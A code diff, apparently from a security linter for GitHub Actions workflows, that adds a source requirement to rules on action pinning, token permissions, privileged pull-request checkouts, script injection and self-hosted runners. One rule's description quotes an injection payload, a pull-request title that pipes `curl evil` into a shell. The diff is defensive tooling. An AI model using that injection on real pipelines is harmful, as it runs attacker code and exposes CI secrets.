@@ -39,7 +39,7 @@ def _own_steps(p: Pipeline) -> list[Step]:
     "A tag or branch can be moved by whoever controls the action's repository (or someone who compromises it); a full commit SHA cannot. "
     "Local actions (./path) are exempt; owners listed in `trusted_owners` may use version tags (never branches).",
     {"gha": "Replace `uses: owner/action@v4` with `uses: owner/action@<40-character commit SHA> # v4.x.y` (Dependabot or Renovate can keep the SHAs current)."},
-    platforms=GHA, params={"trusted_owners": []},
+    platforms=GHA, requires_sources={"gha"}, params={"trusted_owners": []},
 )
 def sup_006(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
     trusted = {o.lower().removesuffix("/*") for o in rule_params(policy, "SUP-006")["trusted_owners"]}
@@ -64,7 +64,7 @@ def sup_006(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
     "GITHUB_TOKEN permissions default to the repository setting (often read-write). A declared top-level `permissions:` block with read-only defaults "
     "and write scopes only on the jobs that need them limits what a compromised step or action can do.",
     {"gha": "Add a top-level `permissions: contents: read` and grant write scopes (id-token, packages, ...) only on the job that needs them; never use write-all."},
-    platforms=GHA, params={"job_write_scopes": ["id-token", "packages", "security-events", "deployments", "attestations", "pull-requests", "checks", "statuses", "pages"]},
+    platforms=GHA, requires_sources={"gha"}, params={"job_write_scopes": ["id-token", "packages", "security-events", "deployments", "attestations", "pull-requests", "checks", "statuses", "pages"]},
 )
 def sec_006(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
     allowed = set(rule_params(policy, "SEC-006")["job_write_scopes"])
@@ -92,7 +92,7 @@ def sec_006(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
     "it hands an outsider those secrets.",
     {"gha": "Do not check out `github.event.pull_request.head.*` / `workflow_run.head_*` in these workflows; split the untrusted build into a plain `pull_request` workflow "
             "and pass only data (reviewed, not executed) to the privileged one."},
-    platforms=GHA,
+    platforms=GHA, requires_sources={"gha"},
 )
 def sec_007(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
     events = set(p.meta.get("events") or [])
@@ -129,7 +129,7 @@ def _injectable(script: str, patterns: list[re.Pattern[str]]) -> list[str]:
     "`${{ github.event.pull_request.title }}` inside `run:` is substituted into the shell script before it runs: a title like `\"; curl evil | sh #` executes. "
     "Pass untrusted values through an environment variable instead.",
     {"gha": "Move the expression to `env:` (e.g. `env: TITLE: ${{ github.event.pull_request.title }}`) and use `\"$TITLE\"` in the script."},
-    platforms=GHA, params={"untrusted_contexts": DEFAULT_UNTRUSTED},
+    platforms=GHA, requires_sources={"gha"}, params={"untrusted_contexts": DEFAULT_UNTRUSTED},
 )
 def sec_008(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
     pats: list[re.Pattern[str]] = []
@@ -153,7 +153,7 @@ def sec_008(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
     "A pull request, issue or comment event can start a workflow; on a self-hosted runner that code runs inside your network and may persist between jobs. "
     "Always a warning (the repository may be private and fork pull requests disabled).",
     {"gha": "Use GitHub-hosted (or ephemeral, isolated) runners for workflows triggered by pull_request, issue_comment and similar events, or require approval for outside collaborators."},
-    platforms=GHA,
+    platforms=GHA, requires_sources={"gha"},
 )
 def sec_009(ctx: RepoContext, policy: Policy, p: Pipeline) -> RuleResult:
     hosted = [j.name for st in p.stages for j in st.jobs if j.self_hosted]
